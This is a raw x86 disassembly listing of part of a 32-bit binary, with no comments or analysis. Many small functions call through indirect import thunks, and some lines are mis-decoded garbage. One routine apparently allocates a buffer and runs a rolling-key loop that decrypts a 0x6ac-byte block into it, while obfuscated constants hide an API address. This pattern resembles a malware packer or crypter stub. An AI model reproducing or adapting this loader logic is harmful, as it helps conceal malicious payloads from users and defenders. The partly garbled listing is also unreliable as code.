  4d10c8:	lea    edi,[ebx-0x84]
  4d10ce:	mov    edx,eax
  4d10d0:	push   edi
  4d10d1:	push   DWORD PTR [edi+0xbc]
  4d10d7:	push   DWORD PTR [edi+0xc8]
  4d10dd:	call   0x4d0cac
  4d10e2:	add    esp,0x8
  4d10e5:	pop    edi
  4d10e6:	push   edi
  4d10e7:	push   0x0
  4d10e9:	call   0x4d07a4
  4d10ee:	add    esp,0x4
  4d10f1:	pop    edi
  4d10f2:	push   edi
  4d10f3:	mov    edx,0x0
  4d10f8:	push   edx
  4d10f9:	call   0x4d12ac
  4d10fe:	add    esp,0x4
  4d1101:	pop    edi
  4d1102:	add    esp,0x40
  4d1105:	pop    ebp
  4d1106:	ret    
  4d1107:	add    BYTE PTR [edi-0x1],bl
  4d110a:	adc    eax,0x4d209c
  4d110f:	call   edi
  4d1111:	add    BYTE PTR [eax],al
  4d1113:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1119:	sub    esp,0x58
  4d111c:	mov    edx,0x4d3194
  4d1121:	cmp    edx,0x3ed4
  4d1127:	jb     0x4d1117
  4d1129:	push   edx
  4d112a:	push   ebx
  4d112b:	push   DWORD PTR [edx+0x60]
  4d112e:	call   0x4d14a8
  4d1133:	add    esp,0x8
  4d1136:	pop    edx
  4d1137:	push   edx
  4d1138:	mov    edx,0x0
  4d113d:	push   edx
  4d113e:	call   0x4d1308
  4d1143:	add    esp,0x4
  4d1146:	pop    edx
  4d1147:	push   edx
  4d1148:	mov    edi,0x0
  4d114d:	push   edi
  4d114e:	call   0x4d0888
  4d1153:	add    esp,0x4
  4d1156:	pop    edx
  4d1157:	add    esp,0x58
  4d115a:	pop    ebp
  4d115b:	ret    
  4d115c:	pop    edi
  4d115d:	call   DWORD PTR ds:0x4d2068
  4d1163:	call   edi
  4d1165:	add    BYTE PTR [eax],al
  4d1167:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d116d:	sub    esp,0x50
  4d1170:	lea    edi,ds:0x4d31e4
  4d1176:	or     edx,0xffffffde
  4d1179:	push   edi
  4d117a:	push   esi
  4d117b:	push   DWORD PTR [edi+0x100]
  4d1181:	call   0x4d1314
  4d1186:	add    esp,0x8
  4d1189:	pop    edi
  4d118a:	push   edi
  4d118b:	mov    edx,0xfffffff4
  4d1190:	push   edx
  4d1191:	call   0x4d1544
  4d1196:	add    esp,0x4
  4d1199:	pop    edi
  4d119a:	push   edi
  4d119b:	call   0x4d14fc
  4d11a0:	add    esp,0x4
  4d11a3:	pop    edi
  4d11a4:	add    esp,0x50
  4d11a7:	pop    ebp
  4d11a8:	ret    
  4d11a9:	add    BYTE PTR [eax],al
  4d11ab:	add    BYTE PTR [edi-0x1],bl
  4d11ae:	adc    eax,0x4d2008
  4d11b3:	call   edi
  4d11b5:	add    BYTE PTR [eax],al
  4d11b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11bd:	sub    esp,0x1c
  4d11c0:	mov    esi,0x4d31fc
  4d11c5:	add    ecx,DWORD PTR [esi-0xa8]
  4d11cb:	mov    edx,0xfffffff4
  4d11d0:	push   edx
  4d11d1:	call   0x4d1544
  4d11d6:	add    esp,0x4
  4d11d9:	push   esi
  4d11da:	push   DWORD PTR [esi+0x168]
  4d11e0:	push   DWORD PTR [esi+0xf8]
  4d11e6:	call   0x4d06f8
  4d11eb:	add    esp,0x8
  4d11ee:	pop    esi
  4d11ef:	push   0x0
  4d11f1:	call   0x4d0a74
  4d11f6:	add    esp,0x4
  4d11f9:	add    esp,0x1c
  4d11fc:	pop    ebp
  4d11fd:	ret    
  4d11fe:	add    BYTE PTR [eax],al
  4d1200:	pop    edi
  4d1201:	call   DWORD PTR ds:0x4d2070
  4d1207:	call   edi
  4d1209:	add    BYTE PTR [eax],al
  4d120b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1211:	sub    esp,0x60
  4d1214:	mov    eax,0x4d318c
  4d1219:	or     ebx,eax
  4d121b:	push   eax
  4d121c:	mov    ebx,0x0
  4d1221:	push   ebx
  4d1222:	call   0x4d073c
  4d1227:	add    esp,0x4
  4d122a:	pop    eax
  4d122b:	push   eax
  4d122c:	push   ecx
  4d122d:	push   DWORD PTR [eax+0x120]
  4d1233:	push   DWORD PTR [eax+0x1c0]
  4d1239:	push   ecx
  4d123a:	call   0x4d12c4
  4d123f:	add    esp,0x10
  4d1242:	pop    eax
  4d1243:	push   eax
  4d1244:	push   0x0
  4d1246:	call   0x4d0f54
  4d124b:	add    esp,0x4
  4d124e:	pop    eax
  4d124f:	add    esp,0x60
  4d1252:	pop    ebp
  4d1253:	ret    
  4d1254:	mov    edi,edi
  4d1256:	push   ebp
  4d1257:	mov    ebp,esp
  4d1259:	sub    esp,0x44
  4d125c:	lea    ebx,[ecx+0xb4]
  4d1262:	mov    DWORD PTR [ebp-0x20],edx
  4d1265:	mov    ecx,0x0
  4d126a:	push   ecx
  4d126b:	call   0x4d0a74
  4d1270:	add    esp,0x4
  4d1273:	push   ebx
  4d1274:	push   ecx
  4d1275:	push   DWORD PTR [ebx+0xd0]
  4d127b:	call   0x4d10c0
  4d1280:	add    esp,0x8
  4d1283:	pop    ebx
  4d1284:	push   0x0
  4d1286:	call   0x4d1594
  4d128b:	add    esp,0x4
  4d128e:	add    esp,0x44
  4d1291:	pop    ebp
  4d1292:	ret    
  4d1293:	add    BYTE PTR [edi-0x1],bl
  4d1296:	adc    eax,0x4d2048
  4d129b:	call   edi
  4d129d:	add    BYTE PTR [eax],al
  4d129f:	add    BYTE PTR [edi-0x1],bl
  4d12a2:	adc    eax,0x4d2044
  4d12a7:	call   edi
  4d12a9:	add    BYTE PTR [eax],al
  4d12ab:	add    BYTE PTR [edi-0x1],bl
  4d12ae:	adc    eax,0x4d2054
  4d12b3:	call   edi
  4d12b5:	add    BYTE PTR [eax],al
  4d12b7:	add    BYTE PTR [edi-0x1],bl
  4d12ba:	adc    eax,0x4d202c
  4d12bf:	call   edi
  4d12c1:	add    BYTE PTR [eax],al
  4d12c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12c9:	sub    esp,0x34
  4d12cc:	lea    ebx,ds:0x4d3058
  4d12d2:	xor    edi,esi
  4d12d4:	push   ebx
  4d12d5:	push   DWORD PTR [ebx+0x13c]
  4d12db:	push   edx
  4d12dc:	push   DWORD PTR [ebx+0x1d0]
  4d12e2:	call   0x4d0ed8
  4d12e7:	add    esp,0xc
  4d12ea:	pop    ebx
  4d12eb:	mov    edi,0x0
  4d12f0:	push   edi
  4d12f1:	call   0x4d1594
  4d12f6:	add    esp,0x4
  4d12f9:	call   0x4d14fc
  4d12fe:	add    esp,0x4
  4d1301:	add    esp,0x34
  4d1304:	pop    ebp
  4d1305:	ret    
  4d1306:	add    BYTE PTR [eax],al
  4d1308:	pop    edi
  4d1309:	call   DWORD PTR ds:0x4d2024
  4d130f:	call   edi
  4d1311:	add    BYTE PTR [eax],al
  4d1313:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1319:	sub    esp,0x5c
  4d131c:	mov    eax,0x4d3054
  4d1321:	sub    ecx,DWORD PTR [eax-0x10]
  4d1324:	push   eax
  4d1325:	push   DWORD PTR [eax+0x1c0]
  4d132b:	push   DWORD PTR [eax+0x100]
  4d1331:	call   0x4d093c
  4d1336:	add    esp,0x8
  4d1339:	pop    eax
  4d133a:	push   eax
  4d133b:	push   0x0
  4d133d:	call   0x4d1594
  4d1342:	add    esp,0x4
  4d1345:	pop    eax
  4d1346:	push   eax
  4d1347:	push   0x0
  4d1349:	call   0x4d12ac
  4d134e:	add    esp,0x4
  4d1351:	pop    eax
  4d1352:	add    esp,0x5c
  4d1355:	pop    ebp
  4d1356:	ret    
  4d1357:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d135d:	sub    esp,0x2c
  4d1360:	add    DWORD PTR [ebp-0x14],esi
  4d1363:	mov    edi,0x4d30d4
  4d1368:	push   edi
  4d1369:	push   0x6ac
  4d136e:	push   0x6ac
  4d1373:	push   0x40001
  4d1378:	mov    ecx,0x862985a6
  4d137d:	push   DWORD PTR [ecx+0x7a239a86]
  4d1383:	sub    DWORD PTR [esp],0x2
  4d1387:	mov    ecx,0x4d2004
  4d138c:	pop    DWORD PTR [ecx]
  4d138e:	call   0x4d144c
  4d1393:	add    esp,0x4
  4d1396:	xchg   DWORD PTR [esp],eax
  4d1399:	mov    edi,eax
  4d139b:	pop    DWORD PTR [edi-0x3c]
  4d139e:	mov    esi,DWORD PTR [edi-0x3c]
  4d13a1:	mov    ebx,esi
  4d13a3:	sub    esi,esi
  4d13a5:	dec    esi
  4d13a6:	and    esi,0x4d0014
  4d13ac:	mov    edx,0xd5d9a824
  4d13b1:	xor    ecx,ecx
  4d13b3:	cmp    ecx,0x6ac
  4d13b9:	je     0x4d13d7
  4d13bb:	sub    ecx,0xfffffffc
  4d13be:	xor    eax,eax
  4d13c0:	push   DWORD PTR [esi+eax*1]
  4d13c3:	add    DWORD PTR [esp],edx
  4d13c6:	pop    DWORD PTR [ebx+eax*2]
  4d13c9:	dec    DWORD PTR [ebx]
  4d13cb:	xor    edx,edx
  4d13cd:	add    edx,DWORD PTR [esi]
  4d13cf:	add    esi,0x4
  4d13d2:	add    ebx,0x4
  4d13d5:	jmp    0x4d13b3
  4d13d7:	push   edi
  4d13d8:	push   0x0
  4d13da:	call   0x4d087c
  4d13df:	add    esp,0x4
  4d13e2:	pop    edi
  4d13e3:	add    esp,0x2c
  4d13e6:	pop    ebp
  4d13e7:	ret    
  4d13e8:	pop    edi
  4d13e9:	call   DWORD PTR ds:0x4d2084
  4d13ef:	call   edi
  4d13f1:	add    BYTE PTR [eax],al
  4d13f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13f9:	sub    esp,0x34
  4d13fc:	mov    ebx,0x4d3174
  4d1401:	adc    eax,DWORD PTR [ebp-0x30]
  4d1404:	push   0x0
  4d1406:	call   0x4d1308
  4d140b:	add    esp,0x4
  4d140e:	push   ebx
  4d140f:	push   esi
  4d1410:	push   DWORD PTR [ebx+0x1d0]
  4d1416:	push   eax
  4d1417:	call   0x4d0adc
  4d141c:	add    esp,0xc
  4d141f:	pop    ebx
  4d1420:	mov    edx,0x0
  4d1425:	push   edx
  4d1426:	call   0x4d1308
  4d142b:	add    esp,0x4
  4d142e:	add    esp,0x34
  4d1431:	pop    ebp
  4d1432:	ret    
  4d1433:	add    BYTE PTR [edi-0x1],bl
  4d1436:	adc    eax,0x4d2060
  4d143b:	call   edi
  4d143d:	add    BYTE PTR [eax],al
  4d143f:	add    BYTE PTR [edi-0x1],bl
  4d1442:	adc    eax,0x4d205c
  4d1447:	call   edi
  4d1449:	add    BYTE PTR [eax],al
  4d144b:	add    BYTE PTR [edi-0x1],bl
  4d144e:	adc    eax,0x4d2004
  4d1453:	call   edi
  4d1455:	add    BYTE PTR [eax],al
  4d1457:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d145d:	sub    esp,0x5c
  4d1460:	lea    ecx,[ebx+0xf8]
  4d1466:	sub    DWORD PTR [ecx-0x44],edx
  4d1469:	push   ecx
  4d146a:	call   0x4d1010
  4d146f:	add    esp,0x4
  4d1472:	pop    ecx
  4d1473:	push   ecx
  4d1474:	push   DWORD PTR [ecx+0xac]
  4d147a:	push   DWORD PTR [ecx+0x68]
  4d147d:	call   0x4d0fb8
  4d1482:	add    esp,0x8
  4d1485:	pop    ecx
  4d1486:	push   ecx
  4d1487:	mov    ecx,0x0
  4d148c:	push   ecx
  4d148d:	call   0x4d0a74
  4d1492:	add    esp,0x4
  4d1495:	pop    ecx
  4d1496:	add    esp,0x5c
  4d1499:	pop    ebp
  4d149a:	ret    
  4d149b:	add    BYTE PTR [edi-0x1],bl
  4d149e:	adc    eax,0x4d206c
  4d14a3:	call   edi
  4d14a5:	add    BYTE PTR [eax],al
  4d14a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14ad:	sub    esp,0x2c
  4d14b0:	mov    eax,0x4d3074
  4d14b5:	or     DWORD PTR [ebp-0x28],0x70
  4d14b9:	push   eax
  4d14ba:	mov    esi,0x0
  4d14bf:	push   esi
  4d14c0:	call   0x4d0f54
  4d14c5:	add    esp,0x4
  4d14c8:	pop    eax
  4d14c9:	push   eax
  4d14ca:	push   ecx
  4d14cb:	push   DWORD PTR [eax+0x88]
  4d14d1:	call   0x4d0804
  4d14d6:	add    esp,0x8
  4d14d9:	pop    eax
  4d14da:	push   eax
  4d14db:	mov    eax,0x0
  4d14e0:	push   eax
  4d14e1:	call   0x4d115c
  4d14e6:	add    esp,0x4
  4d14e9:	pop    eax
  4d14ea:	add    esp,0x2c
  4d14ed:	pop    ebp
  4d14ee:	ret    
  4d14ef:	add    BYTE PTR [edi-0x1],bl
  4d14f2:	adc    eax,0x4d2030
  4d14f7:	call   edi
  4d14f9:	add    BYTE PTR [eax],al
  4d14fb:	add    BYTE PTR [edi-0x1],bl
  4d14fe:	adc    eax,0x4d204c
  4d1503:	call   edi
  4d1505:	add    BYTE PTR [eax],al
  4d1507:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d150d:	sub    esp,0x38
  4d1510:	mov    edx,0x4d3078
  4d1515:	or     DWORD PTR [edx+0x48],0x34
  4d1519:	push   edx
  4d151a:	push   ecx
  4d151b:	push   ecx
  4d151c:	call   0x4d07b0
  4d1521:	add    esp,0x8
  4d1524:	pop    edx
  4d1525:	push   edx
  4d1526:	push   0x0
  4d1528:	call   0x4d073c
  4d152d:	add    esp,0x4
  4d1530:	pop    edx
  4d1531:	push   edx
  4d1532:	push   0x0
  4d1534:	call   0x4d12ac
  4d1539:	add    esp,0x4
  4d153c:	pop    edx
  4d153d:	add    esp,0x38
  4d1540:	pop    ebp
  4d1541:	ret    
  4d1542:	add    BYTE PTR [eax],al
  4d1544:	pop    edi
  4d1545:	call   DWORD PTR ds:0x4d2034
  4d154b:	call   edi
  4d154d:	add    BYTE PTR [eax],al
  4d154f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1555:	sub    esp,0x4c
  4d1558:	lea    edx,ds:0x4d3158
  4d155e:	sbb    DWORD PTR [edx+0x2c],0x338d
  4d1565:	push   edx
  4d1566:	push   DWORD PTR [edx+0x64]
  4d1569:	push   DWORD PTR [edx+0x118]
  4d156f:	push   edi
  4d1570:	call   0x4d0ce8
  4d1575:	add    esp,0xc
  4d1578:	pop    edx
  4d1579:	push   edx
  4d157a:	call   0x4d1294
  4d157f:	add    esp,0x4
  4d1582:	pop    edx
  4d1583:	push   edx
  4d1584:	push   0x0
  4d1586:	call   0x4d1308
  4d158b:	add    esp,0x4
  4d158e:	pop    edx
  4d158f:	add    esp,0x4c
  4d1592:	pop    ebp
  4d1593:	ret    
  4d1594:	pop    edi
  4d1595:	call   DWORD PTR ds:0x4d2018
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
	...
